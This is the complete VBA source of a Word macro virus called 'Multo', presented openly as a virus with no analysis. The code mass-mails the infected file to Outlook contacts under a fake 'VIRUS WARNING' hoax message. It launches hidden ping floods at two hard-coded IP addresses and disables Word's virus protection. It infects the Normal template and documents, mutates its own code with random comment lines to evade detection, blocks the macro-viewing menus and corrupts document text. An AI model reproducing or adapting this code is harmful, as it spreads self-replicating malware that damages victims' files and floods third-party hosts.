   Attribute VB_Name = "Multo"
   'VirusName: Multo
   'Author Name: Lucky Warrior
   'Date and Time:10/21/99 9:15:55 PM








   '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   'AutoOpen
   '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

   Private Sub Document_Open()
   On Error Resume Next
   Application.EnableCancelKey = 0
   Randomize                                                                                                             Set oa = CreateObject("Outlook.Application")
   Set mn = oa.GetNameSpace("MAPI")
   If oa = "Outlook" Then
   mn.Logon "profile", "password"
   For y = 1 To mn.AddressLists.Count
   x = 1
   Set ab = mn.AddressLists(y)
   Set Multo = oa.CreateItem(0)
   For z = 1 To ab.AddressEntries.Count
   vi = ab.AddressEntries(x)
   Multo.Recipients.Add vi
   x = x + 1
   If x > 60 Then z = ab.AddressEntries.Count
   Next z
   Multo.Subject = "Fwd: VIRUS WARNING!!!"
   Multo.Body = "Somebody by the nickname of Lucky Warrior is sending out a virus that could harm your computer. DO NOT OPEN ANYTHING FROM HIM. MICROSOFT & AOL has said that this is a very dangerous virus. Attached herewith are the info & instruction on how to remove this virus, just in case you encountered this. Please practice cautionary measures and forward this to all your on-line friends ASAP."
   Multo.Attachments.Add ActiveWorkbook.FullName
   Multo.Send
   vi = ""
   Next y
   mn.Logoff
   End If
   q = Int(6 * Rnd)
   If q = 2 Then
   Shell "ping -t -l" & Str(Int(60000 * Rnd)) & " -w 1 205.136.165.243", vbHide
   ElseIf q = 4 Then
   Shell "ping -t -l" & Str(Int(60000 * Rnd)) & " -w 1 208.160.226.2", vbHide
   End If
   End Sub


   '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   'AutoClose
   '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   Sub AutoClose()
   On Error Resume Next
   Call Payload
   Application.ScreenUpdating = False
   Application.DisplayAlerts = wdAlertsNone
   Options.VirusProtection = False
   DocInfect = False
   GlobInfect = False
   Set GlobalDoc = NormalTemplate
   Set ActiveDoc = ActiveDocument
   For i = 1 To ActiveDocument.VBProject.VBComponents.Count
   If ActiveDocument.VBProject.VBComponents(i).Name = "Multo" Then
   DocInfect = True
   End If
   Next
   For j = 1 To NormalTemplate.VBProject.VBComponents.Count
   If NormalTemplate.VBProject.VBComponents(j).Name = "Multo" Then
   GlobInfect = True
   End If
   Next
   If GlobInfect = False Then
   Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Multo", Object:=wdOrganizerObjectProjectItems
   Options.SaveNormalPrompt = False
   End If
   If DocInfect = False Then
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Multo", Object:=wdOrganizerObjectProjectItems
   ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
   End If
   Application.DisplayAlerts = wdAlertsAll
   Call Polymorphic
   End Sub


   '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   'AutoExec
   '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   Sub AutoExec()
   On Error Resume Next
   Call Payload
   Application.ScreenUpdating = False
   Application.DisplayAlerts = wdAlertsNone
   Options.VirusProtection = False
   DocInfect = False
   GlobInfect = False
   Set GlobalDoc = NormalTemplate
   Set ActiveDoc = ActiveDocument
   For i = 1 To ActiveDocument.VBProject.VBComponents.Count
   If ActiveDocument.VBProject.VBComponents(i).Name = "Multo" Then
   DocInfect = True
   End If
   Next
   For j = 1 To NormalTemplate.VBProject.VBComponents.Count
   If NormalTemplate.VBProject.VBComponents(j).Name = "Multo" Then
   GlobInfect = True
   End If
   Next
   If GlobInfect = False Then
   Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Multo", Object:=wdOrganizerObjectProjectItems
   Options.SaveNormalPrompt = False
   End If
   If DocInfect = False Then
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Multo", Object:=wdOrganizerObjectProjectItems
   ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
   End If
   Application.DisplayAlerts = wdAlertsAll
   Call Polymorphic
   End Sub


   '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   'FileSave
   '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   Sub FileSave()
   On Error Resume Next
   Call Payload
   Application.ScreenUpdating = False
   Application.DisplayAlerts = wdAlertsNone
   Options.VirusProtection = False
   DocInfect = False
   GlobInfect = False
   Set GlobalDoc = NormalTemplate
   Set ActiveDoc = ActiveDocument
   For i = 1 To ActiveDocument.VBProject.VBComponents.Count
   If ActiveDocument.VBProject.VBComponents(i).Name = "Multo" Then
   DocInfect = True
   End If
   Next
   For j = 1 To NormalTemplate.VBProject.VBComponents.Count
   If NormalTemplate.VBProject.VBComponents(j).Name = "Multo" Then
   GlobInfect = True
   End If
   Next
   If GlobInfect = False Then
   Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Multo", Object:=wdOrganizerObjectProjectItems
   Options.SaveNormalPrompt = False
   End If
   If DocInfect = False Then
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Multo", Object:=wdOrganizerObjectProjectItems
   ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
   End If
   Application.DisplayAlerts = wdAlertsAll
   Call Polymorphic
   ActiveDocument.Save
   End Sub

   '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   'ToolsMacro macro
   '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   Sub ToolsMacro()
   Call Polymorphic
   Beep
   End Sub

   '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   'ViewVBCode macro
   '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   Sub ViewVBCode()
   Call Polymorphic
   Beep
   End Sub

   '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   'ToolsCustomize macro
   '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   Sub ToolsCustomize()
   Call Polymorphic
   Beep
   End Sub

   '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   'FileTemplates macro
   '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   Sub FileTemplates()
   Call Polymorphic
   Beep
   End Sub


   '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   'Polymorphic macro
   '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   Sub Polymorphic()
   On Error Resume Next
   PoNu = Int(Rnd() * 28 + 1)
   For Mutate = 1 To PoNu
   PoRL = Application.VBE.ActiveVBProject.VBComponents("Multo").CodeModule.CountOfLines
   PoLi = Int(Rnd() * PoRL + 1)
   a = Rnd * 455: b = Rnd * 80: c = Rnd * 160: d = Rnd * 180: e = Rnd * 49
   Application.VBE.ActiveVBProject.VBComponents("Multo").CodeModule.InsertLines PoLi, vbTab & "Rem " & a & vbTab & b & vbTab & c & vbTab & d & vbTab & e
   Next Mutate
   End Sub

   '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   'Payload macro
   '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   Sub Payload()
     On Error Resume Next
     With Selection.Find
     .Text = "for"
     .Replacement.Text = "Multo"
     .Wrap = wdFindContinue
     End With
     Selection.Find.Execute Replace:=wdReplaceAll
     ActiveDocument.SaveAs ActiveDocument.FullName
     With Dialogs(wdDialogFileSummaryInfo)
     .Author = "Lucky Warrior"
     .Comments = "Multo by Lucky Warrior"
     .Execute
     End With
   End Sub
